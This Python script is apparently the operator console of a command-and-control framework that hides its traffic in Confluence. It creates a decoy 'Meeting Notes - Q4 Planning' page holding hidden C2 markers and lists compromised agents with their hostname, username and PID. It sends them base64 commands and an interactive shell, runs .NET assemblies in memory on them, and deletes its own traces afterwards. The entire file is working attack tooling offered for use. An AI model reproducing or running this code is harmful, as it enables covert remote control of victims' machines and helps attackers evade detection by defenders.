#!/usr/bin/env python3
# Author: Dhanush Arvind

import argparse
import base64
import json
import os
import re
import sys
import time
import uuid

try:
    import requests
except ImportError:
    print("[!] requests is required: pip install requests")
    sys.exit(1)


HELP_TEXT = """
Available commands:
  task <agent_id> <cmd>       Send command via page body (hidden span)
  ctask <cmd>                 Send command as comment (browser mode, broadcast)
  ctask --agent <id> <cmd>    Send command as comment targeting one agent
  read [agent_id]             Read output comments
  interact <agent_id>         Interactive shell
  inlineexecute <agent_id> <assembly_path> [args]
                              Execute .NET assembly in-memory on agent
  cleanup                     Remove all C2 markers and comments
  help                        Show this help
"""


class ConfluenceOperator:
    def __init__(self, base_url: str, email: str, api_token: str,
                 page_id: str = None):
        self.base_url = base_url.rstrip("/")
        self.auth = (email, api_token)
        self.page_id = page_id
        self.session = requests.Session()
        self.session.auth = self.auth
        self.session.headers["Content-Type"] = "application/json"
        self.session.headers["Accept"] = "application/json"

        if ".atlassian.net" in base_url:
            self.api_base = f"{self.base_url}/wiki/rest/api"
        else:
            self.api_base = f"{self.base_url}/rest/api"

    def _get(self, path: str, params: dict = None):
        r = self.session.get(f"{self.api_base}{path}", params=params)
        r.raise_for_status()
        return r.json()

    def _post(self, path: str, data: dict):
        r = self.session.post(f"{self.api_base}{path}", json=data)
        r.raise_for_status()
        return r.json()

    def _put(self, path: str, data: dict):
        r = self.session.put(f"{self.api_base}{path}", json=data)
        r.raise_for_status()
        return r.json()

    def _get_all_comments(self):
        results = []
        start = 0
        limit = 50
        while True:
            data = self._get(
                f"/content/{self.page_id}/child/comment",
                {"expand": "body.storage,version", "start": start, "limit": limit},
            )
            results.extend(data.get("results", []))
            if data.get("size", 0) < limit:
                break
            start += limit
        return results

    def setup(self, space_key: str, title: str = "Meeting Notes - Q4 Planning"):
        body = {
            "type": "page",
            "title": title,
            "space": {"key": space_key},
            "body": {
                "storage": {
                    "value": (
                        "<h2>Agenda</h2>"
                        "<ul><li>Review Q4 targets</li>"
                        "<li>Resource allocation</li>"
                        "<li>Timeline updates</li></ul>"
                        '<p><span style="display:none">C2:INIT</span></p>'
                    ),
                    "representation": "storage",
                }
            },
        }
        result = self._post("/content", body)
        page_id = result["id"]
        print(f"[+] Created page: {result['title']}")
        print(f"[+] Page ID: {page_id}")
        print(f"[+] URL: {self.base_url}/wiki/spaces/{space_key}/pages/{page_id}")
        print(f"\n    Use --page-id {page_id} for future commands.")
        return page_id

    def list_agents(self):
        comments = self._get_all_comments()
        agents = []

        for c in comments:
            body = c.get("body", {}).get("storage", {}).get("value", "")
            marker = ">C2:REG:"
            idx = body.find(marker)
            if idx < 0:
                continue

            rest = body[idx + len(marker):]
            end = rest.find("</span>")
            if end < 0:
                continue

            payload = rest[:end]
            parts = payload.split(":", 1)
            if len(parts) < 2:
                continue

            agent_id = parts[0]
            try:
                info = json.loads(base64.b64decode(parts[1]).decode())
            except Exception:
                info = {}

            info["agent_id"] = agent_id
            info["_comment_time"] = c.get("version", {}).get("when", "?")
            agents.append(info)

        if not agents:
            print("[*] No agents registered.")
            return

        print(f"\n{'ID':<12} {'Hostname':<20} {'Username':<18} "
              f"{'PID':<8} {'Registered'}")
        print("-" * 80)
        for a in agents:
            print(f"{a.get('agent_id','?'):<12} "
                  f"{a.get('hostname','?'):<20} "
                  f"{a.get('username','?'):<18} "
                  f"{a.get('pid','?'):<8} "
                  f"{a.get('_comment_time','?')}")
        print()
        print(HELP_TEXT)

    def send_task(self, agent_id: str, command: str) -> str:
        task_id = uuid.uuid4().hex[:8]
        cmd_b64 = base64.b64encode(command.encode()).decode()
        marker = (f'<span style="display:none">'
                  f'C2:TASK:{task_id}:{agent_id}:{cmd_b64}</span>')

        page = self._get(f"/content/{self.page_id}",
                         {"expand": "body.storage,version"})
        current_body = page["body"]["storage"]["value"]
        version = page["version"]["number"]

        new_body = current_body + f"\n<p>{marker}</p>"

        update = {
            "version": {"number": version + 1},
            "title": page["title"],
            "type": "page",
            "body": {
                "storage": {
                    "value": new_body,
                    "representation": "storage",
                }
            },
        }

        self._put(f"/content/{self.page_id}", update)
        print(f"[+] Tasked agent {agent_id} | task_id={task_id} | cmd={command}")
        return task_id

    def read_output(self, agent_id: str = None):
        comments = self._get_all_comments()
        outputs = []

        for c in comments:
            body = c.get("body", {}).get("storage", {}).get("value", "")
            marker = ">C2:OUT:"
            idx = body.find(marker)
            if idx < 0:
                continue

            rest = body[idx + len(marker):]
            end = rest.find("</span>")
            if end < 0:
                continue

            payload = rest[:end]
            parts = payload.split(":", 2)
            if len(parts) < 3:
                continue

            tid, aid, b64_out = parts[0], parts[1], parts[2]
            if agent_id and aid != agent_id:
                continue

            try:
                output = base64.b64decode(b64_out).decode("utf-8", errors="replace")
            except Exception:
                output = "(decode error)"

            ts = c.get("version", {}).get("when", "?")
            outputs.append({"task_id": tid, "agent_id": aid,
                           "output": output, "time": ts})

        if not outputs:
            print("[*] No output found.")
            return

        for o in outputs:
            print(f"\n[{o['time']}] agent={o['agent_id']} task={o['task_id']}")
            print(o["output"])

    def interact(self, agent_id: str):
        print(f"\n[*] Interactive session with agent {agent_id}")
        print("[*] Type 'exit' to quit, 'help' for commands\n")

        while True:
            try:
                cmd = input(f"({agent_id})> ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] Session ended.")
                break

            if not cmd:
                continue
            if cmd.lower() == "help":
                print("  Built-in: whoami, pwd, cd, ls, cat, ps, "
                      "ipconfig, netstat, info, download, exit")
                print("  Prefix with 'shell ' for cmd.exe execution")
                print("  execute-assembly <b64> [args] — run .NET in-memory")
                continue
            if cmd.lower() in ("quit", "q"):
                print("[*] Session ended.")
                break

            task_id = self.send_task(agent_id, cmd)
            print("[*] Waiting for output...", end="", flush=True)

            output = self._wait_for_output(agent_id, task_id)
            if output:
                print(f"\n{output}")
            else:
                print("\n[!] Timed out waiting for response.")

            if cmd.lower() == "exit":
                print("[*] Agent instructed to exit.")
                break

    def _wait_for_output(self, agent_id: str, task_id: str,
                         timeout: int = 120, poll: float = 3.0):
        elapsed = 0.0
        while elapsed < timeout:
            comments = self._get_all_comments()
            for c in comments:
                body = c.get("body", {}).get("storage", {}).get("value", "")
                marker = f">C2:OUT:{task_id}:{agent_id}:"
                idx = body.find(marker)
                if idx < 0:
                    continue
                rest = body[idx + len(marker):]
                end = rest.find("</span>")
                if end < 0:
                    continue
                try:
                    return base64.b64decode(rest[:end]).decode(
                        "utf-8", errors="replace")
                except Exception:
                    return "(decode error)"
            time.sleep(poll)
            elapsed += poll
            print(".", end="", flush=True)
        return None

    def send_comment_task(self, command: str, agent_id: str = None):
        if agent_id:
            tag = f"[cmd:{agent_id}]"
        else:
            tag = "[cmd]"

        body = {
            "type": "comment",
            "container": {"id": self.page_id, "type": "page"},
            "body": {
                "storage": {
                    "value": f"<p>{tag} {command}</p>",
                    "representation": "storage",
                }
            },
        }
        result = self._post("/content", body)
        cid = result.get("id", "?")
        target = f"agent {agent_id}" if agent_id else "all agents (broadcast)"
        print(f"[+] Posted comment command (id={cid}) to {target}: {command}")

    def inline_execute(self, agent_id: str, assembly_path: str, args_str: str = ""):
        if not os.path.isfile(assembly_path):
            print(f"[!] Assembly not found: {assembly_path}")
            return

        with open(assembly_path, "rb") as f:
            assembly_bytes = f.read()

        asm_b64 = base64.b64encode(assembly_bytes).decode()
        size_kb = len(assembly_bytes) / 1024

        print(f"[*] Assembly: {assembly_path} ({size_kb:.1f} KB)")
        print(f"[*] Base64 payload: {len(asm_b64)} chars")

        if len(asm_b64) > 200000:
            print("[!] Warning: large payload, may exceed Confluence page body limits")

        command = f"execute-assembly {asm_b64}"
        if args_str:
            command += f" {args_str}"

        task_id = self.send_task(agent_id, command)
        print("[*] Waiting for output...", end="", flush=True)

        output = self._wait_for_output(agent_id, task_id, timeout=180)
        if output:
            print(f"\n{output}")
        else:
            print("\n[!] Timed out waiting for response.")

    def cleanup(self):
        page = self._get(f"/content/{self.page_id}",
                         {"expand": "body.storage,version"})
        body = page["body"]["storage"]["value"]
        version = page["version"]["number"]

        cleaned = re.sub(
            r'<p><span style="display: ?none;">C2:TASK:[^<]+</span></p>\n?', '', body)
        cleaned = re.sub(
            r'<span style="display: ?none;">C2:INIT</span>', '', cleaned)

        if cleaned != body:
            update = {
                "version": {"number": version + 1},
                "title": page["title"],
                "type": "page",
                "body": {
                    "storage": {
                        "value": cleaned,
                        "representation": "storage",
                    }
                },
            }
            self._put(f"/content/{self.page_id}", update)
            print("[+] Cleaned C2 markers from page body.")
        else:
            print("[*] No C2 markers found in page body.")

        comments = self._get_all_comments()
        c2_count = 0
        for c in comments:
            body = c.get("body", {}).get("storage", {}).get("value", "")
            if ">C2:REG:" in body or ">C2:OUT:" in body or "[cmd" in body:
                cid = c["id"]
                self.session.delete(f"{self.api_base}/content/{cid}")
                c2_count += 1

        print(f"[+] Deleted {c2_count} C2 comments.")


def print_help():
    print(HELP_TEXT)


def main():
    parser = argparse.ArgumentParser(description="Confluence C2 Operator")
    parser.add_argument("--url", required=True)
    parser.add_argument("--email", required=True)
    parser.add_argument("--api-token", required=True)
    parser.add_argument("--page-id", default=None)

    sub = parser.add_subparsers(dest="command")

    setup_p = sub.add_parser("setup")
    setup_p.add_argument("--space-key", required=True)
    setup_p.add_argument("--title", default="Meeting Notes - Q4 Planning")

    sub.add_parser("list")
    sub.add_parser("cleanup")
    sub.add_parser("help")

    task_p = sub.add_parser("task")
    task_p.add_argument("agent_id")
    task_p.add_argument("cmd")

    ctask_p = sub.add_parser("ctask")
    ctask_p.add_argument("--agent", default=None)
    ctask_p.add_argument("cmd")

    read_p = sub.add_parser("read")
    read_p.add_argument("agent_id", nargs="?", default=None)

    interact_p = sub.add_parser("interact")
    interact_p.add_argument("agent_id")

    ie_p = sub.add_parser("inlineexecute")
    ie_p.add_argument("agent_id")
    ie_p.add_argument("assembly_path")
    ie_p.add_argument("args", nargs="*", default=[])

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(1)

    if args.command == "help":
        print_help()
        return

    if args.command not in ("setup", "help") and not args.page_id:
        print("[!] --page-id is required for this command.")
        sys.exit(1)

    op = ConfluenceOperator(args.url, args.email, args.api_token, args.page_id)

    if args.command == "setup":
        op.setup(args.space_key, args.title)
    elif args.command == "list":
        op.list_agents()
    elif args.command == "task":
        op.send_task(args.agent_id, args.cmd)
    elif args.command == "ctask":
        op.send_comment_task(args.cmd, agent_id=args.agent)
    elif args.command == "read":
        op.read_output(args.agent_id)
    elif args.command == "interact":
        op.interact(args.agent_id)
    elif args.command == "inlineexecute":
        args_str = " ".join(args.args) if args.args else ""
        op.inline_execute(args.agent_id, args.assembly_path, args_str)
    elif args.command == "cleanup":
        confirm = input("[!] Remove all C2 markers and comments? (yes/no): ")
        if confirm.strip().lower() == "yes":
            op.cleanup()
        else:
            print("[*] Aborted.")


if __name__ == "__main__":
    main()
